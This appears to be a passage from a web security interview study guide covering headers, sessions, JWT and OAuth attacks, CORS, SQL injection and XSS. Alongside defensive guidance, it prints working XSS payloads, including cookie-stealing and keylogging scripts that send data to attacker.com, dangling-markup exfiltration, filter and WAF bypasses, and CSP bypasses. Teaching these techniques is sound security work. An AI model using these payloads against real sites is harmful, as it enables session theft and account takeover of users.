| **X-Content-Type-Options** | Stops the browser from trying to MIME-sniff the content type. | `nosniff` | MIME-sniffing XSS | Browser might execute an image file as JS if it contains valid JS syntax. |
| **Referrer-Policy** | Controls how much referrer information is sent in the `Referer` header. | `strict-origin-when-cross-origin` | Data Leakage | Sensitive tokens in the URL might leak to third-party analytics or external links. |

### CSP Deep Dive
CSP is your primary defense-in-depth against XSS.
- `default-src 'self'`: Only allow resources from the same origin.
- `script-src 'self' 'nonce-rAnd0m'`: Only allow scripts from the same origin OR scripts that have the specific, dynamically generated nonce attribute (`&lt;script nonce="rAnd0m"&gt;`).
- `object-src 'none'`: Prevents loading Flash/Java plugins.

❌ **Common Misunderstanding:** CSP *prevents* XSS bugs from existing.
✅ **Correct:** CSP does not fix the XSS bug in your code; it prevents the *exploitation* of the bug by blocking unauthorized script execution in the browser.

### Deprecated: X-XSS-Protection
- **What it was:** Instructed legacy browsers (IE/Classic Edge) to block pages if XSS was detected in the URL.
- **Why it's deprecated:** It ironically created *new* vulnerabilities (allowing attackers to selectively disable legitimate scripts). Use CSP instead.

<details>
<summary>🎤 Interview Q: "What security headers would you recommend for a new banking application?"</summary>

**Model Answer:**
I would prioritize the following:
1. **HSTS (`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`)**: To guarantee HTTPS and prevent downgrade attacks.
2. **CSP (`Content-Security-Policy`)**: A strict, nonce-based CSP to mitigate XSS impact.
3. **X-Frame-Options (`DENY`)**: To prevent Clickjacking (though CSP `frame-ancestors` supersedes this, XFO is good for legacy support).
4. **X-Content-Type-Options (`nosniff`)**: To prevent MIME confusion attacks.
5. **Referrer-Policy (`strict-origin-when-cross-origin`)**: To prevent leaking sensitive URLs to third parties.
6. **Cache-Control (`no-store, max-age=0`)**: Specifically for authenticated routes, to prevent sensitive data from being cached in the browser.
</details>

---


## 4. Session Management Deep Dive

### What it is
HTTP is stateless. Session management allows a server to recognize that subsequent requests come from the same authenticated user.

### Cookies In-Depth
Cookies are stored by the browser and automatically sent with requests to the matching domain.
**Critical Flags:**
- `Secure`: Cookie is only sent over HTTPS.
- `HttpOnly`: Cookie cannot be accessed via JavaScript (`document.cookie`). Protects against XSS theft.
- `SameSite`: Controls cross-site request behavior (Protects against CSRF).
  - `Strict`: Sent only for first-party, same-site requests.
  - `Lax`: (Default) Sent on top-level navigations (e.g., clicking a link).
  - `None`: Sent on all requests (Requires `Secure` flag).

### Session Attacks
| Attack | Mechanism | Defense |
|--------|-----------|---------|
| **Session Hijacking** | Stealing an active session ID (via XSS, network sniffing). | `HttpOnly`, `Secure` flags, short session timeouts. |
| **Session Fixation** | Attacker forces a known session ID onto the victim. Victim logs in, and the attacker uses the known ID. | Regenerate the session ID immediately upon login. |

**Session Fixation Step-by-Step:**
1. Attacker visits the site and gets an anonymous session ID: `SID=123`.
2. Attacker sends a link to the victim: `https://bank.com/?session=123` (if app accepts SID via URL).
3. Victim clicks, and their browser sets `SID=123`.
4. Victim logs in. The backend associates `SID=123` with the Victim's account.
5. Attacker uses their original `SID=123` and is now logged in as the Victim!

---


## 5. JWT (JSON Web Tokens) — DEEP TREATMENT

### What it is
JWT is a stateless authentication mechanism. Instead of storing a session ID in a database, the server issues a signed token containing user claims.

**Structure:** `Base64Url(Header) . Base64Url(Payload) . Signature`
- **Header:** Defines token type and signing algorithm (e.g., `{"alg": "HS256", "typ": "JWT"}`).
- **Payload:** User data / claims (e.g., `{"sub": "123", "role": "admin"}`).
- **Signature:** Cryptographic hash verifying integrity.

### JWT vs Session
| Feature | Session (Stateful) | JWT (Stateless) |
|---------|--------------------|-----------------|
| **Storage** | Server DB/Redis + Client Cookie | Client only (Cookie or LocalStorage) |
| **Validation** | DB lookup per request | Cryptographic signature verification |
| **Revocation** | Easy (Delete from DB) | Hard (Cannot invalidate until expiration, unless blacklisting is used) |
| **Scalability** | Harder (requires central session store) | Easier (Self-contained) |

### ALL JWT Attacks

**1. "None" Algorithm Attack**
- **Root Cause:** Backend library accepts `"alg": "none"` as a valid algorithm.
- **Flow:** Attacker changes payload to `"role": "admin"`, changes header to `"alg": "none"`, removes signature. Server accepts it.

**2. Algorithm Confusion (RS256 to HS256)**
- **Root Cause:** Server expects RS256 (Asymmetric, Public/Private key). Attacker modifies header to HS256 (Symmetric) and signs the token using the server's *Public Key* as the secret.
- **Flow:** If the backend uses a vulnerable library that doesn't enforce the expected algorithm type, it will verify the HS256 signature using the public key string, which the attacker also used.

**3. Weak Secret Brute-forcing**
- Use tools like `hashcat` to crack poorly chosen HS256 secrets offline.

```python
# Vulnerable JWT Verification (Python PyJWT)
import jwt
# VULNERABLE: Not specifying algorithms allows 'none' or alg confusion!
decoded = jwt.decode(token, public_key, options={"verify_signature": True})

# SECURE
decoded = jwt.decode(token, public_key, algorithms=["RS256"])
```

<details>
<summary>🎤 Interview Q (HSBC): "What is JWK and JOSE in JWT? Have you heard about PS encryption in JWT?"</summary>

**Model Answer:**
- **JOSE (JSON Object Signing and Encryption)**: The overarching framework that standardizes how to securely represent claims. JWT is a specific implementation of the JOSE framework.
- **JWK (JSON Web Key)**: A JSON data structure that represents a cryptographic key. It is often exposed at an endpoint (e.g., `/.well-known/jwks.json`) so clients and API gateways can fetch the public keys needed to verify RS256/ES256 signatures dynamically.
- **PS Encryption (PS256)**: RS256 uses PKCS#1 v1.5 padding, which is susceptible to certain padding oracle attacks historically. PS256 uses RSASSA-PSS (Probabilistic Signature Scheme), which adds randomization to the signature process, making it cryptographically stronger and the recommended modern standard over RS256.
</details>

---

## 6. OAuth 2.0 Deep Dive

### What it is
OAuth 2.0 is an **authorization** framework (not authentication, though often used for it via OpenID Connect). It allows a user to grant a third-party application limited access to their resources on another site, without sharing their password.
*Analogy:* Giving a valet key to a parking attendant. They can drive the car, but can't open the trunk or keep the car forever.

### Authorization Code Flow (Most Secure/Common)
1. User clicks "Login with Google" on `App`.
2. `App` redirects user to Google with `client_id`, `redirect_uri`, `scope`, and `state`.
3. User logs into Google and consents.
4. Google redirects back to `App's` `redirect_uri` with a temporary `code` and the `state`.
5. `App` validates `state` (CSRF protection), then makes a backend server-to-server call to Google.
6. `App` trades the `code` + `client_secret` for an `Access Token`.

### OAuth Attacks
- **CSRF in OAuth (State manipulation):** If `App` doesn't use/validate the `state` parameter, an attacker can start a flow, get an auth code for *their own* account, and trick the victim into clicking the callback URL. The victim is now logged into the *attacker's* account on `App`.
- **Open Redirect / Token Leakage:** If the Authorization Server doesn't strictly validate the `redirect_uri`, an attacker can redirect the token/code to `https://attacker.com`.

<details>
<summary>🎤 Interview Q: "Explain the Implicit flow and why it is deprecated."</summary>

**Model Answer:**
In the Implicit flow, the Authorization Server returns the Access Token directly in the URL fragment (e.g., `#token=xyz`) upon redirect, bypassing the code exchange. It was designed for Single Page Applications (SPAs) without a backend.
**Why deprecated:** Returning tokens in the URL is highly insecure. They can leak via the `Referer` header, browser history, or be stolen by XSS. Modern SPAs should use the Authorization Code Flow with PKCE (Proof Key for Code Exchange), which dynamically creates a secret per request, avoiding static client secrets while keeping tokens out of the URL.
</details>

---

## 7. Frontend Security

### The Browser Security Model
The fundamental security boundary of the web is the **Same-Origin Policy (SOP)**. It states that JavaScript running on `https://site-a.com` cannot read data from `https://site-b.com`. (Origin = Scheme + Host + Port).

### Cross-Origin Resource Sharing (CORS)
CORS is a mechanism that allows servers to selectively bypass SOP.
- Vulnerability: `Access-Control-Allow-Origin: *` (with credentials) allows any site to read sensitive data.

### Subresource Integrity (SRI)
Protects against compromised CDNs. You specify a hash in the `&lt;script&gt;` tag. If the CDN file is altered by an attacker, the hash won't match, and the browser refuses to execute it.
```html
<script src="https://cdn.example.com/library.js" integrity="sha384-oqVuAfXR..." crossorigin="anonymous"></script>
```

<details>
<summary>🎤 Interview Q (HSBC): "If CSP is implemented, how do you bypass it in XSS?"</summary>

**Model Answer:**
Bypassing CSP depends on its misconfigurations.
1. **Open/Weak Sources**: If `script-src` includes `https://ajax.googleapis.com`, I can find an old, vulnerable JSONP endpoint hosted there to execute my script.
2. **Missing `object-src 'none'`**: I can inject a malicious Flash or PDF object to run JS.
3. **`unsafe-eval` allowed**: If present, I can inject payloads using `eval()` or `setTimeout()`.
4. **Base Tag Hijacking**: If `base-uri` is missing, I can inject `&lt;base href="https://attacker.com"&gt;` to hijack relative script loads.
5. **Dangling Markup**: If execution is totally blocked, I can exfiltrate data (like CSRF tokens) by injecting `<img src="https://attacker.com/?leak=` and leaving the quote open to capture surrounding HTML.
</details>

---

## 8. Backend Security

### Server-Side Rendering (SSR) vs Client-Side Rendering (CSR)
- **SSR (e.g., PHP, Django templates):** HTML is generated on the server. High risk of **Server-Side Template Injection (SSTI)** and traditional XSS.
- **CSR (e.g., React, Angular):** HTML is generated in the browser via JS. Lower risk of basic XSS (frameworks auto-escape), but high risk of **DOM-based XSS** and API-level authorization flaws (BOLA).

### Database Interactions
❌ **Vulnerable (Raw SQL concatenation):**
```python
cursor.execute(f"SELECT * FROM users WHERE username = '{user_input}'")
```
✅ **Secure (Parameterized Queries / Prepared Statements):**
```python
cursor.execute("SELECT * FROM users WHERE username = %s", (user_input,))
```
ORMs (Object-Relational Mappers) like SQLAlchemy generally use parameterized queries by default, preventing SQLi.

---

## 9. Modern Web Architecture

### Microservices & Service Mesh
Instead of a monolith, applications are split into small services.
- **Security Implication:** Internal network is no longer "trusted."
- **Defense:** **mTLS (Mutual TLS)** via a Service Mesh (like Istio). Both the calling service and receiving service authenticate each other via certificates.

### WebSockets
Provides full-duplex, persistent communication over a single TCP connection.
- **Risks:** Cross-Site WebSocket Hijacking (CSWSH) - similar to CSRF but for WebSockets. Lack of origin validation allows malicious sites to open WebSocket connections to the server on behalf of the victim.

### Serverless (AWS Lambda)
- **Risks:** Insecure third-party dependencies, excessive IAM permissions (over-privileged functions), and event-data injection (injecting payloads via S3 triggers or API Gateway).

---

## 10. Burp Suite Mastery

Burp Suite is the industry standard proxy for intercepting and modifying HTTP traffic.

### Core Tools Workflow
1. **Proxy**: Configure your browser to send traffic through Burp. Intercept requests, modify parameters, and forward them.
2. **Repeater**: Send a specific request to Repeater. Modify it manually and send it repeatedly to see how the server responds (perfect for testing SQLi, IDOR).
3. **Intruder**: Automate fuzzing. Select payload positions (e.g., `id=§123§`) and load a wordlist to brute-force directories or bypass rate limits.
4. **Decoder**: Quickly URL-decode, Base64-decode, or HTML-decode payloads.
5. **Comparer**: Diff two responses to see exactly what changed (useful for blind injection techniques).

🔬 **Recommended Lab:** PortSwigger Web Security Academy - "Getting started with Burp Suite".

---

## 11. RBAC vs ABAC

| Feature | RBAC (Role-Based Access Control) | ABAC (Attribute-Based Access Control) |
|---------|----------------------------------|---------------------------------------|
| **Definition** | Access is based on predefined roles. | Access is based on dynamic attributes (user, resource, environment). |
| **Examples** | `Role = Admin`, `Role = User` | `User.Dept = HR AND Document.Type = Salary AND Time < 5PM` |
| **Granularity** | Coarse-grained. | Fine-grained. |
| **Complexity** | Easy to implement and audit. | Complex to implement, requires policy engines. |
| **When to use** | Standard applications with clear hierarchies. | Enterprise applications requiring contextual decisions (e.g., zero-trust, geolocation). |

<details>
<summary>🎤 Interview Q: "What is RBAC vs ABAC?"</summary>

**Model Answer:**
RBAC grants permissions based on static roles assigned to a user (e.g., an 'Editor' can edit posts). It is simple but scales poorly if you need granular control. 
ABAC grants permissions by evaluating dynamic attributes of the user, the resource, and the environment. For example, allowing access only if the user is in the 'Finance' department, the document is marked 'Confidential', and the request originates from the corporate VPN. ABAC provides much finer control but is significantly harder to engineer and maintain.
</details>

# Section 3: Web Application Security Vulnerabilities (Weeks 5-8)

Welcome to the largest and most critical section of this guide. We will dive extremely deep into Web Application Security Vulnerabilities. We cover what they are, why they happen, how to exploit them, how to fix them, and how to discuss them in top-tier interviews (HSBC, Flipkart, Razorpay, CRED, etc.).

---

## 1. OWASP Top 10 (2021) Overview

### 🎯 What it is
The **Open Worldwide Application Security Project (OWASP)** Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications. 

### ⚙️ Why it matters
Companies use the OWASP Top 10 to structure their security programs, build secure coding guidelines, and frame interview questions. It is the absolute baseline of application security.

### 📊 2017 vs 2021 Comparison Table

| Rank | 2017 Vulnerability | 2021 Vulnerability | Change Notes |
|------|--------------------|--------------------|--------------|
| 1 | Injection | Broken Access Control | Access control moved up from #5; 94% of apps tested have some form of broken access control. |
| 2 | Broken Authentication | Cryptographic Failures | Previously "Sensitive Data Exposure". Focus is now on the root cause: failed cryptography. |
| 3 | Sensitive Data Exposure | Injection | Injection fell to #3. Cross-Site Scripting (XSS) is now merged into this category. |
| 4 | XML External Entities (XXE) | Insecure Design | **NEW** category focusing on missing/ineffective control design. |
| 5 | Broken Access Control | Security Misconfiguration | XXE was merged into Security Misconfiguration. |
| 6 | Security Misconfiguration | Vulnerable and Outdated Components | Previously #9, moved up significantly due to supply chain risks. |
| 7 | Cross-Site Scripting (XSS) | Identification and Authentication Failures | Previously "Broken Authentication". |
| 8 | Insecure Deserialization | Software and Data Integrity Failures | **NEW** category. Includes Insecure Deserialization. |
| 9 | Using Components with Known Vulnerabilities | Security Logging and Monitoring Failures | Expanded to include more types of monitoring failures. |
| 10 | Insufficient Logging & Monitoring | Server-Side Request Forgery (SSRF) | **NEW** (from community survey). Deeply covered later in this guide. |

---


## 2. Cross-Site Scripting (XSS) — DEEPEST TREATMENT

### 🎯 What it is
Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious client-side scripts (usually JavaScript) into web pages viewed by other users. 

**Deep explanation:** The browser has no way to know that the script should not be trusted, so it executes it. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.

### ⚙️ Why it happens (Root Cause)
XSS occurs when an application includes untrusted data in a web page without proper **validation** or **escaping**. 

### 📊 Types/Variations Comparison Table

| Type | Data Source | Execution Location | Persistence | Detectability |
|------|-------------|--------------------|-------------|---------------|
| **Reflected** | HTTP Request (URL/Body) | Server-side template rendering | Temporary (single request) | High (often caught by WAF/SAST) |
| **Stored** | Database/File system | Server-side template rendering | Permanent (until deleted) | High (SAST/DAST) |
| **DOM-based**| Client-side (URL hash, etc) | Client-side JavaScript (browser) | Temporary or Permanent | Low (Server doesn't see the payload) |

### 🛠️ Step-by-Step Attack Flow (Reflected XSS)

1. **Attacker crafts payload:** `https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;`
2. **Victim clicks link:** The victim is tricked into clicking this link.
3. **Server processes request:** 
   ```http
   GET /search?q=<script>alert(1)</script> HTTP/1.1
   Host: example.com
   ```
4. **Server reflects payload:**
   ```http
   HTTP/1.1 200 OK
   Content-Type: text/html

   <html><body>You searched for: <script>alert(1)</script></body></html>
   ```
5. **Browser executes:** The browser parses the HTML, hits the `&lt;script&gt;` tag, and executes it.

### 💻 XSS Contexts and Payloads

**1. HTML Context** (Between standard tags)
- Payload: `&lt;script&gt;alert(1)&lt;/script&gt;`
- Payload: `&lt;img src=x onerror=alert(1)&gt;`

**2. Attribute Context** (Inside an HTML attribute)
- Vulnerable: `&lt;input type="text" name="user" value="USER_INPUT"&gt;`
- Payload: `">&lt;script&gt;alert(1)&lt;/script&gt;`
- Result: `&lt;input type="text" name="user" value=""&gt;&lt;script&gt;alert(1)&lt;/script&gt;">`

**3. JavaScript Context** (Inside an existing script block)
- Vulnerable: `&lt;script&gt;var name = 'USER_INPUT';&lt;/script&gt;`
- Payload: `'; alert(1); //`
- Result: `&lt;script&gt;var name = ''; alert(1); //';&lt;/script&gt;`

**4. URL Context** (Inside a href attribute)
- Vulnerable: `<a href="USER_INPUT">Click</a>`
- Payload: `javascript:alert(1)`

### ☠️ Real Payloads (Beyond `alert(1)`)

**Cookie Stealing:**
```html
<script>
  new Image().src="http://attacker.com/log?c=" + document.cookie;
</script>
```

**Keylogging:**
```html
<script>
  document.onkeypress = function(e) {
    fetch('http://attacker.com/k?key=' + e.key);
  }
</script>
```

**Session Hijacking / Account Takeover (CSRF via XSS):**
```html
<script>
  // Change victim's password automatically
  fetch('/change-password', {
    method: 'POST',
    body: 'new_password=hacked123',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
  });
</script>
```

### 🛡️ XSS Filter / WAF Bypasses (10 Techniques)
1. **Case Variation:** `&lt;sCripT&gt;alert(1)&lt;/ScRipt&gt;`
2. **Null Byte:** `&lt;scri%00pt&gt;alert(1)&lt;/script&gt;`
3. **Double Encoding:** `%253Cscript%253E`
4. **No Spaces:** `&lt;img/src=x/onerror=alert(1)&gt;`
5. **Backticks instead of quotes:** `&lt;img src=x onerror=alert('1')&gt;`
6. **SVG tags:** `&lt;svg/onload=alert(1)&gt;`
7. **Body tag:** `&lt;body onload=alert(1)&gt;`
8. **Iframe injection:** `&lt;iframe src="javascript:alert(1)"&gt;`
9. **Hex encoding:** `&lt;script&gt;eval('\x61\x6c\x65\x72\x74\x28\x31\x29')&lt;/script&gt;`
10. **Details tag (no user interaction):** `<details open ontoggle=alert(1)>`

### 🛡️ Content Security Policy (CSP)
CSP is an HTTP header that allows site operators to restrict the resources (such as JavaScript, CSS, Images) that a browser is allowed to load for a given page.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
```

<details>
<summary>🎤 Interview Q: If CSP is implemented, how do you bypass it in XSS? (HSBC)</summary>

**Model Answer:**
Bypassing CSP depends on how it is misconfigured. Here are 4 primary ways:

1. **Allowed CDN Libraries (JSONP bypass):**
   If `script-src` allows a CDN like `ajax.googleapis.com`, we can use a vulnerable JSONP endpoint hosted there.
   Payload: `&lt;script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js"&gt;&lt;/script&gt;&lt;div ng-app&gt;{{constructor.constructor('alert(1)')()}}&lt;/div&gt;`

2. **Dangling Markup (Data Exfiltration):**
   If we can't execute JS, but we want to steal data (like CSRF tokens). We inject an unclosed image tag.
   Payload: `<img src="http://attacker.com/log?leak=` 
   The browser will append the rest of the HTML (including tokens) to the URL until it hits a quote.

3. **Base Tag Injection:**
   If `base-uri` is not restricted, inject `&lt;base href="http://attacker.com/"&gt;`. Relative scripts (like `&lt;script src="/app.js"&gt;`) will now load from the attacker's domain!

4. **Missing `object-src` restriction:**
   If `object-src` is missing, you can inject a Flash or PDF applet that executes JavaScript (`&lt;object data="data:text/html;base64,..."&gt;`).
</details>

### 📊 DOM XSS Sources and Sinks

| Sources (Where data enters) | Sinks (Where data executes) |
|-----------------------------|-----------------------------|
| `location.search` | `innerHTML` |
| `location.hash` | `document.write()` |
| `document.referrer` | `eval()` |
| `window.name` | `setTimeout()` / `setInterval()` |

### 🔬 Brief Variants
- **Mutation XSS (mXSS):** Payload is initially safe, but the browser's HTML sanitizer/parser mutates it into a malicious payload (e.g., changing innerHTML).
- **Self-XSS:** Social engineering where the victim is tricked into pasting a payload into their own developer console.

### 💻 Code Examples

**Vulnerable Code (Node.js/Express):**
```javascript
app.get('/greet', (req, res) => {
    // ❌ Vulnerable: Directly concatenating user input
    res.send(`<h1>Hello ${req.query.name}</h1>`); 
});
```

**Secure Code (Node.js/Express with DOMPurify/Entity Encoding):**
```javascript
const escapeHTML = str => str.replace(/[&<>'"]/g, 
    tag => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        "'": '&#39;',
        '"': '&quot;'
    }[tag]));

app.get('/greet', (req, res) => {
    // ✅ Secure: Context-aware output encoding
    res.send(`<h1>Hello ${escapeHTML(req.query.name)}</h1>`); 
});
```

### ❌ Misunderstandings
- ❌ **Myth:** Web Application Firewalls (WAFs) completely block XSS.
- ✅ **Fact:** WAFs are easily bypassed via encoding tricks or DOM XSS (which WAFs can't see). Context-aware output encoding is the only true fix.
- ❌ **Myth:** Filtering `&lt;script&gt;` tags stops XSS.
- ✅ **Fact:** XSS can trigger via HTML attributes (`onload`, `onerror`), `javascript:` URIs, etc.

### 🌍 Real-world Impact
- **Samy Worm (MySpace):** Stored XSS worm that gained over 1 million friends in 20 hours.
- **British Airways (Magecart):** XSS used to inject a credit card skimmer into the payment page.

- **DVWA (Damn Vulnerable Web App):** XSS sections
